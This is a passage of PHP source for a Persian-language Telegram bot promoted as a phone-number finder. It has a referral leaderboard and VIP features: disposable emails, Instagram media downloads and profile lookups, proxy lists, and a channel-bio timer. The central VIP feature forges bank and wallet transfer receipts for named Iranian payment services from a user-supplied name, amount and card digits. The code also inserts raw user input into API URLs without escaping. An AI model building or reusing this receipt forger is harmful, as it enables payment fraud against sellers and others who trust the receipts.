✅ | متصل به شماره یاب سامانه شکار 


♻️ | همین الان ربات شماره یاب رو استارت کن و شماره دوستت رو پیدا کن . . .


« قابلیت های بیشتر تر و جذاب تر »
« آوردن زیر مجموعه و ساخت ربات شماره یاب »

💯 برای دعوت دوستان خود روی دکمه زیر بزنید 👇🏻
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text' => "🥂 | دعوت دوستان ",'url' => "https://telegram.me/share/url?url=https://t.me/$botuser?start=$from_id"]],
]
])
]);
}
if($text == "🎗 | برترین های زیر مجموعه" and $tc == 'private'){
$views = GetRanks("inv");
$user_view_1 = $views[0]['user'];
$mojodi_view_1 = $views[0]['coins'];
$user_view_2 = $views[1]['user'];
$mojodi_view_2 = $views[1]['coins'];
$user_view_3 = $views[2]['user'];
$mojodi_view_3 = $views[2]['coins'];
$user_view_4 = $views[3]['user'];
$mojodi_view_4 = $views[3]['coins'];
$user_view_5 = $views[4]['user'];
$mojodi_view_5 = $views[4]['coins'];
$user_view_6 = $views[5]['user'];
$mojodi_view_6 = $views[5]['coins'];
$user_view_7 = $views[6]['user'];
$mojodi_view_7 = $views[6]['coins'];
$user_view_8 = $views[7]['user'];
$mojodi_view_8 = $views[7]['coins'];
$user_view_9 = $views[8]['user'];
$mojodi_view_9 = $views[8]['coins'];
$user_view_10 = $views[9]['user'];
$mojodi_view_10 = $views[9]['coins'];
$datas["step"] = "free";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎁 | برترین کاربران در زیر مجموعه گیری 

🔰 ⟩ نفر اول
📊 | شماره کاربری : `$user_view_1`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_1

🔰 ⟩ نفر دوم
📊 | شماره کاربری : `$user_view_2`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_2

🔰 ⟩ نفر سوم
📊 | شماره کاربری : `$user_view_3`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_3

🔰 ⟩ نفر چهارم
📊 | شماره کاربری : `$user_view_4`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_4

🔰 ⟩ نفر پنجم
📊 | شماره کاربری : `$user_view_5`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_5

🔰 ⟩ نفر شیشم
📊 | شماره کاربری : `$user_view_6`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_6

🔰 ⟩ نفر هفتم
📊 | شماره کاربری : `$user_view_7`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_7

🔰 ⟩ نفر هشتم
📊 | شماره کاربری : `$user_view_8`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_8

🔰 ⟩ نفر نهم
📊 | شماره کاربری : `$user_view_9`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_9

🔰 ⟩ نفر دهم
📊 | شماره کاربری : `$user_view_10`
🎈 | تعداد جذب زیر مجموعه : $mojodi_view_10

",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>"🎊 | زیر مجموعه گیری"]],
[['text'=>"🎗 | برترین های زیر مجموعه"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
])
]);
exit();
}
if($text == "🆘 | پشتیبانی" and $tc == 'private'){
$datas["step"] = "sjdkekdowd";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📝 | متن پیام خود را در قالب یک پیام ارسال کنید
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "sjdkekdowd" and $tc == 'private'){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('ForwardMessage',[
'chat_id'=>$admin[0],
'from_chat_id'=>$from_id,
'message_id'=>$message_id
]);
bot('sendMessage',[
'chat_id'=>$admin[0],
'text'=>"ᴜsᴇʀ ɪᴅ : `$from_id`",
'parse_mode'=>'MarkDown',
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"پیام شما با موفقیت ارسال شد ✅",
'reply_markup'=>$menu
]);
}
elseif($text == "🌟 | بخش ویژه ربات"){
if( $type == "vip"){
bot('sendmessage', [
'chat_id' =>$chat_id,
'text' =>"🎉 | به بخش ویژه ربات شماره یاب اِسلُو فایندر خوش آمدید . . .",
'parse_mode'=>'html',
'reply_markup'=>$vipkey
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
❌ | متاسفانه حساب کاربری شما رایگان است
🎁 | از دکمه زیر میتوانید حساب کاربری خود را ویژه کنید 👇🏻
",
'parse_mode'=>'MarkDown',  
'reply_markup'=>json_encode(['keyboard'=>[
[['text'=>'⭐️ | ویژه کردن حساب']],
[['text'=>'🔙 | بازگشت']],
],'resize_keyboard'=>true
])
]);
}
}
elseif($text == "⭐️ | ویژه کردن حساب" and $type == "vip"){
bot('sendmessage', [
'chat_id' =>$chat_id,
'text' =>"✅ | حساب شما از قبل ویژه شده است 

🎉 | به بخش ویژه ربات شماره یاب اِسلُو فایندر خوش آمدید . . .
",
'parse_mode'=>'html',
'reply_markup'=>$vipkey
]);
}
elseif($text == "⭐️ | ویژه کردن حساب"){
if($coin >= 5){
$datas = json_decode(file_get_contents("data/$from_id/$from_id.json"),true);
$coin = $datas["coin"];
$newcoin = $coin - 5;
$datas["coin"] = $newcoin;
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$datas = json_decode(file_get_contents("data/$from_id/$from_id.json"),true);
$datas["type"] = "vip";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text' =>"
🎊 | کاربر گرامی با موفقیت حساب شما ویژه شد و تعداد `5` سکه از شما کم شد . . .

🎈 | با استفاده از دکمه زیر میتوانید به بخش ویژه بروید 
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode(['keyboard'=>[
[['text' => "🌟 | بخش ویژه ربات"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
'one_time_keyboard' => true,
])
]);
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text' =>"
❌ | امتیاز شما برای ویژه شدن کافی نمیباشد . . .

📌 | حداقل امتیاز برای ویژه شدن `5` امتیاز است . . .
",
'parse_mode'=>'MarkDown',
'reply_markup'=>$keyback
]);
}
}
//===[SPEED]===//
if($text == "🔖 | رسید فیک" and $type == "vip"){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄

✔️ نوع رسید فیک خود را از لیست زیر انتخاب کنید :

┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
•••⟩⟩ ʙᴏᴛ ɪᴅ : @$botuser ⟨⟨•••
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"ملت",'callback_data'=>'mellat'],['text'=>"کاغذی",'callback_data'=>'kaq']],
[['text'=>"آپ",'callback_data'=>'app'],['text'=>"سکه",'callback_data'=>'seke']],
[['text'=>"ایوا",'callback_data'=>'eva'],['text'=>"دیجی پی",'callback_data'=>'digipay']],
[['text'=>"تاپ",'callback_data'=>'top'],['text'=>"بله",'callback_data'=>'bale']],
[['text'=>"کیف پول",'callback_data'=>'kif'],['text'=>"هفت هشتاد",'callback_data'=>'hafash']],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
[['text'=>"$date",'callback_data'=>'prooo'],['text'=>'📆 تاریخ ◄','callback_data'=>'prooo']],
[['text'=>"$time",'callback_data'=>'prooo'],['text'=>'⏰ ساعت ◄','callback_data'=>'prooo']],
[['text'=>"•=•=•=•=•=•=•=•=•=•=•=•=•=•=•=•",'callback_data'=>'prooo']],
]])
]);
}
elseif(strpos($step, "FakeResid-") !== false and $text != "🔙 | بازگشت" and $tc == 'private'){
$ras = explode("-",$step)[1];
$all = explode("\n",$text);
if(preg_match("/[ا-ی]/", $all[0])){
if(preg_match("/[0-9]/", $all[1])){
if(preg_match("/[0-9]/", $all[2]) and strlen($all[2]) == 4){
if(preg_match("/[0-9]/", $all[3]) and strlen($all[3]) == 16){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"🔍 | درحال ساخت . . . !",
]);
bot('sendPhoto',[
'chat_id'=>$from_id,
'photo'=>"$domain/API/photo.php?x=$ras&n={$all[0]}&m={$all[1]}&c1=****-****-****-{$all[2]}&c2={$all[3]}",
]);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"👈🏻⁩ به منوی اصلی بازگشتید",
'reply_markup'=>$menu
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❗️| خط چهارم باید شماره کارت مقصد باشد که 16 رقم است",
'reply_markup'=>$keyback
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❗️| خط سوم باید چهار رقم اخر شماره کارت مبدا باشد",
'reply_markup'=>$keyback
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❗️| خط دوم باید مبلغ انتقالی باشد",
'reply_markup'=>$keyback
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"❗️| خط اول باید نام صاحب کارت مبدا باشد",
'reply_markup'=>$keyback
]);
}
}
if($text == "📧 | ایمیل فیک" and $type == "vip"){
$get = file_get_contents("$domain/API/email.php?method=GetNewMail");
$array = json_decode($get,true);
$email = $array['results']['email'];
$datas["step"] = "GetMessage-$email";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎉 | با موفقیت ایمیل فیک شما ساخته شد !
📧 | ایمیل شما : `$email`

✅ | هر پیامی برای ایمیل شما بالا شما بیاد میتوانید با استفاده از دکمه زیر پیام های دریافتی را مشاهده کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode(['keyboard'=>[
[['text' => "📧 | ایمیل فیک"],['text' => "📩 | دریافت پیام ها"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
'input_field_placeholder'=>"📧 دریافت ایمیل فیک . . ."
])
]);
}
elseif(strpos($step, "GetMessage-") !== false and $text == "📩 | دریافت پیام ها" and $tc == 'private'){
$email = str_replace('GetMessage-',null,$step);
$get = file_get_contents("$domain/API/email.php?method=GetMessages&email=$email");
$array = json_decode($get,true);
if($array['results'] == "No Messages In This Fake Mail !"){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ | درحال حاضر هیچ پیامی به ایمیل ( `$email` ) ارسال نشده است !
",
'parse_mode'=>'MarkDown',
]);
}else{
foreach($array['results'] as $msg){
$msg_id = bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🌟 | موضوع پیام : <b>{$msg['subject']}</b>

📑 | پیام :

{$msg['body_text']}

🔋 | ایدی پیام : <code>{$msg['id']}</code>
",
'parse_mode'=>'HTML',
])->result->message_id;
$who = str_replace(['>','<','"'],[""],$msg['from']);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ | فرستنده پیام : $who
",
'reply_to_message_id'=>$msg_id,
]);
}
}
}
if($text == "💫 | اینستاگرام" and $type == "vip"){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎈 | گزینه مورد نظر را از کیبورد زیر انتخاب کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>json_encode(['keyboard'=>[
[['text' => "✔️ | اطلاعات پیج"],['text' => "📥 | دانلود پست"]],
[['text' => "📥 | دانلود هایلایت"],['text' => "📥 | دانلود استوری"]],
[['text' => "🔙 | بازگشت"]],
],'resize_keyboard'=>true,
'input_field_placeholder'=>"⚡️ اینستاگرام . . ."
])
]);
}
if($text == "📥 | دانلود استوری" and $type == "vip"){
$datas["step"] = "downloadStory";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎈 آدرس پیج مورد نظر را ارسال کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "downloadStory" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ _درحال پردازش . . ._
",
'parse_mode'=>'MarkDown',
]);
if($text == true){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$get = file_get_contents("$domain/API/instagram.php?url=$text&type=story");
$array = json_decode($get,true);
$count = $array['count'];
$Results = $array['Results'];
if($Results != "wrong id|server problem"){
if($Results != "no story|private account|server problem"){
for($i = 0;$i < $count;$i++){
$story = $array['Results'][$i]['story'];
bot('SendVideo',[
'chat_id'=>$from_id,
'video'=>"$story",
'caption'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
@$botuser | @SlowTM
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
",
]);
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ تمام استوری های پیج `( $text )` برای شما ارسال شدند
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
*@$botuser*
",
'parse_mode'=>'MarkDown',
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ پیج `( $text )` *هیچ استوری* ندارد !
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ ادرس پیج ارسال شده *صحیح نمی‌باشد !*
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ لطفاً فقط پیام خود را بصورت *متن* ارسال کنید !
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "📥 | دانلود هایلایت" and $type == "vip"){
$datas["step"] = "downloadhighlight";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎈 آدرس پیج مورد نظر را ارسال کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "downloadhighlight" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ _درحال پردازش . . ._
",
'parse_mode'=>'MarkDown',
]);
if($text == true){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$get = file_get_contents("$domain/API/instagram.php?url=$text&type=highlight");
$array = json_decode($get,true);
$count = $array['count'];
$Results = $array['Results'];
if($Results != "wrong id|server problem"){
if($Results != "no highlight|server problem"){
for($i = 0;$i < $count;$i++){
$highlight = $array['Results'][$i]['highlight'];
bot('SendVideo',[
'chat_id'=>$from_id,
'video'=>"$highlight",
'caption'=>"
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
@$botuser | @SlowTM
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
",
]);
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ تمام هایلایت های پیج `( $text )` برای شما ارسال شدند
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
*@$botuser*
",
'parse_mode'=>'MarkDown',
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ پیج `( $text )` *هیچ هایلایتی* ندارد !
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ ادرس پیج ارسال شده *صحیح نمی‌باشد !*
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ لطفاً فقط پیام خود را بصورت *متن* ارسال کنید !
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "📥 | دانلود پست" and $type == "vip"){
$datas["step"] = "downloadpost";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🎈 لینک پست مورد نظر را ارسال کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "downloadpost" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ _درحال پردازش . . ._
",
'parse_mode'=>'MarkDown',
]);
if($text == true){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$get = file_get_contents("$domain/API/instagram.php?url=$text&type=post");
$array = json_decode($get,true);
if($array['Results'][0]['post'] != null){
for($i = 0;$i < 10;$i++){
$types = $array['Results'][$i]['type'];
$link = $array['Results'][$i]['post'];
$caption = $array['Results'][$i]['caption'];
if($types == "jpg"){
bot('SendPhoto',[
'chat_id'=>$from_id,
'photo'=>"$link",
'caption'=>"$caption",
]);
}
if($types == "mp4"){
bot('SendVideo',[
'chat_id'=>$from_id,
'video'=>"$link",
'caption'=>"$caption",
]);
}
}
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
✅ تمام پست های این لینک برای شما ارسال شدند ! 
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
*@$botuser*
",
'parse_mode'=>'MarkDown',
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ لینک ارسال شده *صحیح نمی‌باشد !*
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ لطفاً فقط پیام خود را بصورت *متن* ارسال کنید !
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "✔️ | اطلاعات پیج" and $type == "vip"){
$datas["step"] = "infopage";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🌹 ادرس پیج مورد نظر جهت دریافت اطلاعات وارد کنید !
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
if($step == "infopage" and $text != "🔙 | بازگشت" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
♻️ _درحال پردازش . . ._
",
'parse_mode'=>'MarkDown',
]);
if($text == true){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$get = file_get_contents("$domain/API/instagram.php?url=$text&type=info");
$array = json_decode($get,true);
$id = $array['Results'][0]['id'];
$user_names = $array['Results'][0]['username'];
$is_private = $array['Results'][0]['is_private'];
$photo = $array['Results'][0]['profile_pic_url'];
$biography = $array['Results'][0]['biography'];
$full_name = $array['Results'][0]['full_name'];
$post = $array['Results'][0]['post_count'];
$follower = $array['Results'][0]['follower_count'];
$following = $array['Results'][0]['following_count'];
if($is_private == "true"){
$is_privates = "✅ خصوصی است";
}else{
$is_privates = "❌ خصوصی نیست";
}
if($biography == null){
$biography = "⚠️ خالی می‌باشد";
}
if($full_name == null){
$full_name = "⚠️ خالی می‌باشد";
}
if($id != null){
bot('SendPhoto',[
'chat_id'=>$from_id,
'photo'=>"$photo",
'caption'=>"
🔐 ای دی : `$id`
📂 یوزرنیم : `$user_names`
🔍 خصوصی بودن پیج : `$is_privates`
📑 بیوگرافی : `$biography`
🎈 اسم کامل : `$full_name`
📨 تعداد پست ها : `$post`
🎁 فالوور ها : `$follower`
📌 دنبال شونده ها : `$following`
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
@$botuser
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ ادرس پیج `( $text )` پیدا نشد ! *مجدد تلاش کنید !*
",
'parse_mode'=>'MarkDown',
]);
}
}else{
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⚠️ لطفاً فقط پیام خود را بصورت *متن* ارسال کنید !
",
'parse_mode'=>'MarkDown',
]);
}
}
if($text == "🌐 | پروکسی HTTPS" and $type == "vip"){
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
$get = file_get_contents("$domain/API/proxy.php");
$array = json_decode($get,true);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🌐 پروکسی HTTPS جدید ! 
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][0]["IP Address"]}
✅ PORT : {$array["list"][0]["Port"]}
✅ CODE : {$array["list"][0]["Code"]}
✅ COUNTRY : {$array["list"][0]["Country"]}
✅ ANONYMITY : {$array["list"][0]["Anonymity"]}
✅ GOOGLE : {$array["list"][0]["Google"]}
✅ HTTPS : {$array["list"][0]["Https"]}
✅ LAST CHECKED : {$array["list"][0]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][1]["IP Address"]}
✅ PORT : {$array["list"][1]["Port"]}
✅ CODE : {$array["list"][1]["Code"]}
✅ COUNTRY : {$array["list"][1]["Country"]}
✅ ANONYMITY : {$array["list"][1]["Anonymity"]}
✅ GOOGLE : {$array["list"][1]["Google"]}
✅ HTTPS : {$array["list"][1]["Https"]}
✅ LAST CHECKED : {$array["list"][1]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][2]["IP Address"]}
✅ PORT : {$array["list"][2]["Port"]}
✅ CODE : {$array["list"][2]["Code"]}
✅ COUNTRY : {$array["list"][2]["Country"]}
✅ ANONYMITY : {$array["list"][2]["Anonymity"]}
✅ GOOGLE : {$array["list"][2]["Google"]}
✅ HTTPS : {$array["list"][2]["Https"]}
✅ LAST CHECKED : {$array["list"][2]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][3]["IP Address"]}
✅ PORT : {$array["list"][3]["Port"]}
✅ CODE : {$array["list"][3]["Code"]}
✅ COUNTRY : {$array["list"][3]["Country"]}
✅ ANONYMITY : {$array["list"][3]["Anonymity"]}
✅ GOOGLE : {$array["list"][3]["Google"]}
✅ HTTPS : {$array["list"][3]["Https"]}
✅ LAST CHECKED : {$array["list"][3]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][4]["IP Address"]}
✅ PORT : {$array["list"][4]["Port"]}
✅ CODE : {$array["list"][4]["Code"]}
✅ COUNTRY : {$array["list"][4]["Country"]}
✅ ANONYMITY : {$array["list"][4]["Anonymity"]}
✅ GOOGLE : {$array["list"][4]["Google"]}
✅ HTTPS : {$array["list"][4]["Https"]}
✅ LAST CHECKED : {$array["list"][4]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
✅ IP ADDRESS : {$array["list"][5]["IP Address"]}
✅ PORT : {$array["list"][5]["Port"]}
✅ CODE : {$array["list"][5]["Code"]}
✅ COUNTRY : {$array["list"][5]["Country"]}
✅ ANONYMITY : {$array["list"][5]["Anonymity"]}
✅ GOOGLE : {$array["list"][5]["Google"]}
✅ HTTPS : {$array["list"][5]["Https"]}
✅ LAST CHECKED : {$array["list"][5]["Last Checked"]}
┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄┄┅┈┉┅┉┈┅┄
@$botuser
",
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
if($text == "⏰ | تایم بیو کانال" and $type == "vip" and $tc == 'private'){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
⏰ | راهنما فعال کردن تایم در بیوگرافی کانال خود ! 


✅ تنظیم کانال و بیوگرافی جدید : /time

✅ حذف کانال و بیوگرافی : /DelTime

✅ تغییر بیوگرافی کانال ثبت شده : /bio

✅ تغییر لینک کانال ثبت شده : /link


⚠️ | _نکته مهم_ : حتما ربات ( @SlowTeamBot ) را استارت کرده و ربات ( @SlowTeamBot ) را در کانالی که ثبت کرده اید *ادمین کنید*
*( دسترسی تغییر اطلاعات کانال رو هم برای ربات باز کنید برای ویرایش بیوگرافی کانال )*
",
'parse_mode'=>'MarkDown',
'reply_markup'=>json_encode([
'inline_keyboard'=>[
[['text'=>"╔═══════════════════╗",'callback_data'=>'join']],
[['text'=>"$date",'callback_data'=>'join'],['text'=>'📆 تاریخ ◄','callback_data'=>'join']],
[['text'=>"$time",'callback_data'=>'join'],['text'=>'⏰ ساعت ◄','callback_data'=>'join']],
[['text'=>"$day_name",'callback_data'=>'join'],['text'=>'⏳ روز ◄','callback_data'=>'join']],
[['text'=>"╚═══════════════════╝",'callback_data'=>'join']],
]
])
]);
}
elseif(strpos($text , '/link') !== false and $type == "vip" and $tc == 'private'){
if($link != null){
$datas["step"] = "SetCanL";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
📊 | ای دی کانال جدید خود را *با ( @ )* ارسال کنید . . . .

📥 مثال : @SlowTM
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}else{
$datas["step"] = "none";
$outjson = json_encode($datas,true);
file_put_contents("data/$from_id/$from_id.json",$outjson);
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
🤔 | شما کانالی ثبت نکرده ایـد کـه بخواهید لینک آنرا عوض کنید
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
}
}
if($step == "SetCanL" and $text != "🔙 | بازگشت" and $tc == 'private'){
$text = str_replace(["q","w","e","r","t","y","u","i","o","p","a","s","d","f","g","h","j","k","l","z","x","c","v","b","n","m"],["Q","W","E","R","T","Y","U","I","O","P","A","S","D","F","G","H","J","K","L","Z","X","C","V","B","N","M"],$text);
$info = file_get_contents("time.txt");
$exp = explode("\n",$info);
if(in_array($text,$exp)){
bot('sendMessage',[
'chat_id'=>$from_id,
'text'=>"
💯 | این کانال از قبل توسط یک نفر دیگر ثبت شده است ! 
",
'parse_mode'=>'MarkDown',
'reply_to_message_id'=>$message_id,
'reply_markup'=>$keyback
]);
exit();
}
if(strpos($text, '@') !== false and preg_match('/^(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)|(.*)(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)|(q|w|e|r|t|y|u|i|o|p|a|s|d|f|g|h|j|k|l|z|x|c|v|b|n|m|Q|W|E|R|T|Y|U|I|O|P|A|S|D|F|G|H|J|K|L|Z|X|C|V|B|N|M)(.*)/',$text)){
$title = bot('getchat',['chat_id'=>"$text"])->result->title;
if($title != null){
$dcoeockencn = file_get_contents("time.txt");
$fncndkckek = str_replace($link, "none . . . !", $dcoeockencn);
file_put_contents("time.txt", $fncndkckek);
$myfile2 = fopen("time.txt", "a") or die("Unable to open file!");
fwrite($myfile2, "$text\n");
fclose($myfile2);
$timeJs["$from_id"]['link'] = "$text";
